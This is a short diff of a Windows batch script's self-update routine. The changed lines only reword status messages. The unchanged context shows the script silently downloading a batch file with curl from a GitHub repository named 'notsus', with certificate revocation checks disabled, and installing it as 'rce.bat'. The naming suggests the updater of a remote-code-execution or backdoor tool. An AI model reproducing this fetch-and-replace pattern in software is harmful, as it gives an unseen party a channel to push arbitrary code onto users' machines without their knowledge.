@@ -10,11 +10,12 @@ if exist updated.txt (
 )
 
 if %version%==%latest_version% (
-	echo we are on latest version
+	echo "We are on latest version! No need to update!"
 ) else (
-	echo we arent on latest version lmao
+	echo We aren't on latest version! Updating...
 	curl -o rce1.bat -s --ssl-no-revoke https://raw.githubusercontent.com/NajdzrBalls/notsus/main/P/rce.bat
-	move rce1.bat rce.bat
+    move rce1.bat rce.bat
+	echo Sucessfully updated!
 )
 
 del ver.dat
